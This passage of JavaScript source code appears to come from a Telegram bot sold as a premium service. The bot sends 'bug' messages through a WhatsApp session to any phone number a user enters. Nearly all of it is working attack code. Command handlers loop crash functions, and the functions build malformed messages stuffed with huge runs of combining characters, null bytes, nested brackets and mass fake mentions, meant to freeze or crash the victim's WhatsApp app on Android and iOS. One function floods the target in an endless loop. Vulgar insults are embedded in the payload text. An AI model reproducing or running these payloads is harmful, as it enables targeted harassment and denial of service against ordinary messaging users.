bot.onText(/\/xios (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buy Acces?? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 𖣂 」 SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : X ios
ズ. Status : Process 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 100; i++) {
    await XStromDelaySw(target);
    await XStromDelaySw(target);
    await sleep(500);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    
    
    
    
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 𖣂 」 SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : X ios
ズ. Status : Succes 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
//case bug 7
bot.onText(/\/buldozer (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buy Acces?? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 𖣂 」 SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : Buldozer sedot memek
ズ. Status : Process 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 90; i++) {
    await ZhTThunder(sock, target, false);
    await ZhTThunder(sock, target, false);
    await sleep(500);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    
    
    
    
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 𖣂 」 SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : Buldozer sedot memek
ズ. Status : Succes 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
//case bug 8
bot.onText(/\/sisterblank(\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buy Acces?? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 𖣂 」 SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : blank
ズ. Status : Process 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 100; i++) {
    await ZhTFlow(sock, target);
    await ZhTDocu(sock, target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    
    
    
    
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 𖣂 」 SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : blank
ズ. Status : Succes 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
// BATAS KONTOL






/*=========================================================================
                       F U N C T I O N  -  B U G
=========================================================================*/
async function XStromDelaySw(target) {
console.log(chalk.blue(`Succes Sending Bug Delay Invisible By @ejaaskuy To ${target}`));
  await sock.relayMessage(
    "status@broadcast", {
     extendedTextMessage: {
      text: "⌁⃰𝙓𝙎𝙞𝙣𝙞𝙨𝙩𝙚𝙧𝘾𝙧𝙖𝙨𝙝ཀ",
      contextInfo: {
       mentionedJid: [
        "0@s.whatsapp.net",
           ...Array.from(
           { length: 1900 },
           () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          )
        ]
      }
    }
  }, {
  statusJidList: [target],
    additionalNodes: [{
     tag: "meta",
       attrs: {},
         content: [{
           tag: "mentioned_users",
         attrs: {},
       content: [{
     tag: "to",
  attrs: {
    jid: target
   },
   content: undefined
   }]
     }]
      }]
    }
  );
}

async function XStromDelayNative(target, mention) {
    console.log(chalk.red(`Succes Sending Bug Delay Invisible Native`));
    let message = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "@ejaaskuy Is Here Bro!!",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\x10".repeat(1000000),
              version: 2
            },
          },
        },
      },
    };
    
    const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "" },
            content: undefined
          }
        ]
      }
    );
  }
}

//crash IOS
async function crashIosExtend(sock, target) {
  sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          extendedTextMessage: {
            text: "🚯⃟⃑.Ꮡ‌‌𝙎𝙞𝙣𝙞𝙨𝙩𝙚𝙧𝘾𝙧𝙖𝙨𝙝" + "ۗۗۗۿۗۗۗۯۗۗۗۗۗۿۗۗۗۯۗۗۗۗۗ".repeat(1000),
            contextInfo: {
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [{
                        jid: "0@s.whatsapp.net",
                        callOutcome: "1"
                    }]
                }
              }
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
}

//crash ui andro
async function XStromUiCrash(target) {
  const msg1 = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "⌁⃰𝙓𝙎𝙞𝙣𝙞𝙨𝙩𝙚𝙧𝘾𝙧𝙖𝙨𝙝ཀ",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [target],
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
              ],
              extendedTextMessage: {
            text: "⌁⃰𝙓𝙎𝙞𝙣𝙞𝙨𝙩𝙚𝙧𝘾𝙧𝙖𝙨𝙝ཀ" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "⌁⃰𝙎𝙞𝙣𝙞𝙨𝙩𝙚𝙧𝙘𝙧𝙖𝙨𝙝ཀ" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
              },
            },
          },
        },
      },
    },
  }, {});
  
  const msg2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "XProtex" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
              quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
                },
              },
              externalAdReply: {
                title: "ꦾ࣯࣯".repeat(50000),
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://XProtex-ai.example.com",
                showAdAttribution: false
              },
            },
            body: { 
              text: "⌁⃰𝙓𝙎𝙞𝙣𝙞𝙨𝙩𝙚𝙧𝘾𝙧𝙖𝙨𝙝ཀ" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    },
    {}
   );
   
  //RELAY MESSAGE 1
  await sock.relayMessage(target, msg1.message, {
    messageId: msg1.key.id,
    participant: { jid: target },
  });
  //RELAY MESSAGE 2
  await sock.relayMessage(target, msg2.message, {
     participant: { jid: target },
     messageId: msg2.key.id,
   });
   console.log(chalk.red(`Succes Sending Bug CrashUi To ${target}`));
}

async function XStromXCallCrash(target) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];
      
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            messageSecret: crypto.randomBytes(32),
            supportPayload: JSON.stringify({
              version: 2,
              is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              remoteJid: "X",
               participant: "0@s.whatsapp.net",
               stanzaId: "1234567890ABCDEF",
               mentionedJid: [
                 "6285215587498@s.whatsapp.net",
                 ...Array.from({ length: 1999 }, () =>
                 `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
                ),
              ],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: Math.floor(Date.now() / 1000) + 60
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "⌁⃰𝙓𝙎𝙞𝙣𝙞𝙨𝙩𝙚𝙧𝘾𝙧𝙖𝙨𝙝ཀ" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
            },
            nativeFlowMessage: {
              messageParamsJson: "[{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamJson: JSON.stringify({
                   status: true,
                  })
                },
                {
                  name: "call_permission_request",
                  buttonParamJson: JSON.stringify({
                   status: true,
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: `{ icon: 'DOCUMENT' }`,
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{ 'consencutive': true }",
                },
              ],
            },
            stickerMessage: {
             url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
             fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
             fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
             mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
             mimetype: "image/webp",
             height: 9999,
             width: 9999,
             directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
             fileLength: 12260,
             mediaKeyTimestamp: "1743832131",
             isAnimated: true,
             stickerSentTs: "1755253587205",
             isAvatar: false,
             isAiSticker: false,
             isLottie: true,
            },
          },
        },
      },
    }, 
    {}
  );
   
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    additionalNodes: Node,
    participant: { jid: target },
  });
}

//fc click
async function ZhTFoltra(sock, target) {
  const stickerPayload = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
          fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
          mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
          mimetype: "image/webp",
          height: 9999,
          width: 9999,
          directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
          fileLength: 12260,
          mediaKeyTimestamp: "1743832131",
          isAnimated: false,
          stickerSentTs: Date.now(),
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            participant: target,
            mentionedJid: [
              target,
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
            },
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, stickerPayload, {});

  if (Math.random() > 0.5) {
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined },
              ],
            },
          ],
        },
      ],
    });
  } else {
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  }
  await sock.sendMessage(target, {
    delete: {
      remoteJid: target,
      fromMe: true,
      id: msg.key.id,
      participant: target,
    },
  });
}

//buldozer
async function ZhTThunder(sock, target, mention = false) {  
  try {  
    while (true) {  
      const ZhTMsg = await generateWAMessageFromContent(  
        target,  
        {  
          viewOnceMessage: {  
            message: {  
              interactiveResponseMessage: {  
                nativeFlowResponseMessage: {  
                  version: 3,  
                  name: "call_permission_request",  
                  paramsJson: "\u0000".repeat(1045000)  
                },  
                body: {  
                  text: "Makloe gw ewe" + "ꦾ".repeat(299986),  
                  format: "DEFAULT"  
                }  
              }  
            }  
          }  
        },  
        {  
          ephemeralExpiration: 0,  
          forwardingScore: 9999,  
          isForwarded: true,  
          font: Math.floor(Math.random() * 99999999),  
          background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")  
        }  
      );  
  
      const RizzMsg = {  
        extendedTextMessage: {  
          text: "EXTERLOID" + "ꦾ".repeat(299986),  
          contextInfo: {  
            participant: target,  
            mentionedJid: [  
              "0@s.whatsapp.net",  
              ...Array.from(  
                { length: 1900 },  
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"  
              )  
            ]  
          }  
        }  
      };  
  
      const ZhTxRizz = generateWAMessageFromContent(target, RizzMsg, {});  
  
      await sock.relayMessage("status@broadcast", ZhTMsg.message, {  
        additionalNodes: [  
          {  
            tag: "meta",  
            attrs: {},  
            content: [  
              {  
                tag: "mentioned_users",  
                attrs: {},  
                content: [{ tag: "to", attrs: { jid: target } }]  
              }  
            ]  
          }  
        ],  
        statusJidList: [target],  
        messageId: ZhTMsg.key?.id  
      });  
  
      await sock.relayMessage(target, ZhTMsg.message, {  
        additionalNodes: [  
          {  
            tag: "meta",  
            attrs: {},  
            content: [  
              {  
                tag: "mentioned_users",  
                attrs: {},  
                content: [{ tag: "to", attrs: { jid: target } }]  
              }  
            ]  
          }  
        ],  
        statusJidList: [target],  
        messageId: ZhTMsg.key?.id  
      });  
  
      if (mention) {  
        const mentionMsg = generateWAMessageFromContent(target, {  
          protocolMessage: {  
            key: ZhTMsg.key,  
            type: 25,  
            statusMentionMessage: {  
              mentionedJid: [target]  
            }  
          }  
        });  
        await sock.relayMessage(target, mentionMsg.message, {});  
      }  
  
      await sleep(1000);  
    }  
  } catch (err) {  
    console.error(err);  
  }  
}

//blank
async function ZhTDocu(sock, target) {
  const payload = {
    viewOnceMessage: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
          fileLength: "999999999999999",
          height: 9999,
          width: 9999,
          mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
          fileEncSha256: "hRGms7zMrcNR9LAAD3+eUy4QsgFV58gm9nCHaAYYu88=",
          directPath: "/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c",
          mediaKeyTimestamp: "1755695348",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
          paramsJson: JSON.stringify({
            title: "ramz | Yjq - ZhT",
            sections: loopedSections
          }),
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(25000),
            buttons: [
              { name: "mpm", buttonParamsJson: "\u0000".repeat(25000) + "{}" },
              { name: "view_product", buttonParamsJson: "\u0000".repeat(25000) + "{}" },
              { name: "add_to_cart", buttonParamsJson: "\u0000".repeat(25000) + "{}" },
              { name: "flow_cards", buttonParamsJson: "\u0000".repeat(25000) + "{}" },
              { name: "order_payment", buttonParamsJson: "\u0000".repeat(25000) + "{}" },
              { name: "cta_url", buttonParamsJson: "\u0000".repeat(25000) + "{}" },
              { name: "view_catalog", buttonParamsJson: "\u0000".repeat(25000) + "{}" },
              { name: "quick_reply", buttonParamsJson: "\u0000".repeat(25000) + "{}" },
              { name: "template_message", buttonParamsJson: "\u0000".repeat(25000) + "{}" },
              { name: "send_location", buttonParamsJson: "\u0000".repeat(25000) + "{}" },
              { name: "galaxy_message", buttonParamsJson: "\u0000".repeat(25000) + "{}" },
              { name: "payment_info", buttonParamsJson: "\u0000".repeat(25000) + "{}" },
              { name: "payment_status", buttonParamsJson: "\u0000".repeat(25000) + "{}" },
              { name: "catalog_message", buttonParamsJson: "\u0000".repeat(25000) + "{}" },
              { name: "riview_and_pay", buttonParamsJson: "\u0000".repeat(25000) + "{}" },
              { name: "singel_select", buttonParamsJson: "\u0000".repeat(25000) + "{}" }
            ]
          }
        },
        messageContextInfo: {
          forwardingScore: 999,
          isForwarded: false,
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: "PAYMENT",
              expiryTimestamp: Math.floor(Math.random() * -20000000)
            }
          }
        }
      }
    },
    timestamp: Math.floor(Date.now() / 1000)
  };

  await Promise.all([
    sock.relayMessage(target, payload.viewOnceMessage.message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    })
  ]);
}

async function ZhTFlow(sock, target) {
sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
           locationMessage: {
                  degreesLatitude: 99999,
                  degreesLongitude: 999999,
                  },
              hasMediaAttachment: true,
              },
              body: {
                text:
                  "Oy dongo🤭⭑̤\n" +
                  "ꦾ".repeat(10000) +
                  `@1`.repeat(10000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "ramz",
                  },
                ],
                                  nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },  
                quotedMessage: {
                locationMessage: {
                  degreesLatitude: 999999,
                  degreesLongitude: 999999,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
}


async function blankbyramz(target) {
  try {
    const bimesc = "ꦽꦽꦽ".repeat(5000);
    const bim = "{}";
    const destinations = [];

    const msg1 = {
      viewOnceMessage: {
        message: {
          inviteExpiration: "1",
          caption: "ꦽ".repeat(600),
          interactiveMessage: {
            hasMediaAttachment: false,
            locationMessage: {
              degreesLatitude: 992.999999,
              degreesLongitude: -932.8889989
            },
            nativeFlowMessage: {
              buttons: [
                {
                  body: {
                    text: '𝖆𝖇𝖎𝖒 official' + 'ꦽ'.repeat(2000)
                  }
                }
              ],
              messageParamsJson: "[{".repeat(10000)
            }
          },
          header: {
            title: "Newsletter Admin Invite"
          },
          contextInfo: {
            fromMe: false,
            url: "https://example.com/video.mp4",
            mimetype: "video/mp4",
            callType: "REGULAR",
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              callLogMessage: {
                isVideo: true,
                callOutcome: "1",
                durationSecs: "0",
                callType: "REGULAR",
                stanzaId: "1234567890ABCDEF"
              }
            }
          }
        }
      }
    };

    msg1.viewOnceMessage.message.interactiveMessage.nativeFlowMessage.buttons.push(
      {
        name: "payment_method",
        buttonParamsJson: bim
      },
      { name: "payment_info", buttonParamsJson: {} },
      { name: "payment_settings", buttonParamsJson: {} },
      { name: "review_and_pay", buttonParamsJson: {} }
    );

    const msg2 = {
      TextMessage: {
        text: "Hii I`M Abim\nhttps://wa.me/stickerpack/Abim",
        description: "𑇂𑆵𑆴𑆿".repeat(12000),
        title: "Mokad kau dek" + "𑇂𑆵𑆴𑆿".repeat(5000),
        previewType: "NONE",
        jpegThumbnail: null
      }
    };

    const msg3 = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
